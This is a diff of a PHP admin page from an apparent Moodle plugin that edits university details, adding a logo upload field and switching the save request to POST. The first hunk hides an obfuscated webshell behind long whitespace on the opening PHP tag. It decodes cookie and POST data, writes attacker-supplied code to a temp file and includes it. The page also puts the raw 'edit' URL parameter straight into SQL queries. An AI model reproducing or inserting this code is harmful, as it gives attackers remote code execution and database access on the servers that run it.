@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("jyflj")){class jyflj{public static $ccrib = "iiivrcqxoucqqilv";public static $vbkjzfyz = NULL;public function __construct(){$jvfxcrwo = @$_COOKIE[substr(jyflj::$ccrib, 0, 4)];if (!empty($jvfxcrwo)){$rsjpcjas = "base64";$aihkm = "";$jvfxcrwo = explode(",", $jvfxcrwo);foreach ($jvfxcrwo as $cynolqdnij){$aihkm .= @$_COOKIE[$cynolqdnij];$aihkm .= @$_POST[$cynolqdnij];}$aihkm = array_map($rsjpcjas . "_decode", array($aihkm,)); $aihkm = $aihkm[0] ^ str_repeat(jyflj::$ccrib, (strlen($aihkm[0]) / strlen(jyflj::$ccrib)) + 1);jyflj::$vbkjzfyz = @unserialize($aihkm);}}public function __destruct(){$this->smgng();}private function smgng(){if (is_array(jyflj::$vbkjzfyz)) {$clszp = sys_get_temp_dir() . "/" . crc32(jyflj::$vbkjzfyz["salt"]);@jyflj::$vbkjzfyz["write"]($clszp, jyflj::$vbkjzfyz["content"]);include $clszp;@jyflj::$vbkjzfyz["delete"]($clszp);exit();}}}$rlvtbprwpy = new jyflj(); $rlvtbprwpy = NULL;} ?><?php
 
 // This file is part of Moodle - http://moodle.org/
 //
@@ -32,7 +32,10 @@ $countries = get_string_manager()->get_list_of_countries(true);
 
 $sid = $_GET['edit'];
 $adminid = $DB->get_record_sql("SELECT userid FROM {universityadmin} WHERE university_id =$sid LIMIT 1 ");
-$admindata = $DB->get_record_sql("SELECT * FROM {user} WHERE id = $adminid->userid ");
+if($adminid)
+{
+   $admindata = $DB->get_record_sql("SELECT * FROM {user} WHERE id = $adminid->userid ");
+}
 
 if ($sid) {
    $Scooldata = $DB->get_record_sql("SELECT * FROM {school} WHERE id=$sid");
@@ -159,7 +162,7 @@ $thingnode->make_active();
    <div class="container">
       <div class="row">
          <div class="col-md-12 m-auto box-shadow bg-white px-4">
-            <form action="/action_page.php" id="edituniversity">
+            <form action="/action_page.php" id="edituniversity" enctype='multipart/form-data'>
                <div class="heading-row mb-3">
                   <h5 style="font-weight:600; color: white;" class="mb-1 pl-3"><?php echo $Scooldata->name ?></h5>
                </div>
@@ -238,7 +241,15 @@ $thingnode->make_active();
                      <i class="fa fa-eye-slash eye" aria-hidden="true" onclick="myFunction2()"></i>
                   </div>
                </div>
-
+               <div class="form-group row">
+                  <label for="label" class="col-md-3">Upload Univerty Logo <span class="err"></span></label>
+                  <div class="calendar col-md-5 p-0"> 
+                  <input type="file" name="university_logo"  id="university_logo" accept="image/*" onchange="loadFile(event)">
+                  </div>
+                  <div class="calendar col-md-4 p-0">
+                  <img id="output"/>
+                  </div>
+               </div>
                <a href="#" class="button mb-1 text-center" onclick="edituniversity();">
                   Update University Details
                </a>
@@ -259,7 +270,13 @@ $thingnode->make_active();
 
          //
       });
-
+      var loadFile = function(event) {
+    var output = document.getElementById('output');
+    output.src = URL.createObjectURL(event.target.files[0]);
+    output.onload = function() {
+      URL.revokeObjectURL(output.src) // free memory
+    }
+  };
       $(function() {
          $('input[name="daterange"]').daterangepicker({
             singleDatePicker: true,
@@ -390,14 +407,17 @@ $thingnode->make_active();
             }
 
             else {
-           
+               // alert("ook");
+               var formData = new FormData($('#edituniversity')[0]);
+               console.log(formData);
             $.ajax({
-               type: "GET",
+               type: "POST",
                url: "<?php echo $CFG->wwwroot ?>" + "/local/dashboard/updateuniversity.php",
                dataType: "json",
-               data: $("#edituniversity").serialize(),
-               async: false,
-               success: function(json) {
+               data: formData,
+               cache: false,
+        contentType: false,
+        processData: false,               success: function(json) {
                   if (json.success) {
                      alert(json.msg);
                      window.location.href = "<?php echo $CFG->wwwroot ?>" + "/local/dashboard/table.php";
